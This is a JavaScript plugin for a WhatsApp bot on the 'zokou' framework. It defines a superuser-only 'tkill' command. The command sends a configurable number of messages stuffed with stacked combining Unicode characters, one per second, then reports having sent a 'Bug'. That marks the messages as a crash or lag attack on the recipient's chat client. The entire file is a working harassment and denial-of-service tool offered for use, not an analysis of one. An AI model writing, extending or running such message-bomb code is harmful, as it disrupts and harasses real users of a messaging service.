const { zokou } = require("../framework/zokou");
const conf = require("../set");

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

zokou(
  {
    nomCom: "tkill",
    categorie: "Mods",
    reaction: "😈",
  },
  async (dest, zk, { arg, attention, repondre, superUser }) => {
    if (!superUser) {
      repondre("You are not authorized to use this command!!!");
      return;
    }

    try {
      const limit = conf.TKILL_MESSAGE_LIMIT;
      for (let i = 0; i < limit; i++) {
        await attention(`☠️𓆪⃞⃟⃟𓆪⃞᜴࿆͆🌤️𓆩ℓσя∂𒆜ткм𓆪 ѕαуѕ🖕😈🖕☠️⃰͜͡؜⭐️᜴▴ткм-вσт ͜͡𓆪⃞⃟⃟𓆪⃞╮\n`);
        await sleep(1000);
      }
      repondre("_Success sending Bug via tkill. Please Wait for 3 Minutes_");
    } catch (error) {
      console.error(error);
      repondre("An error occurred while executing the command.");
    }
  }
);
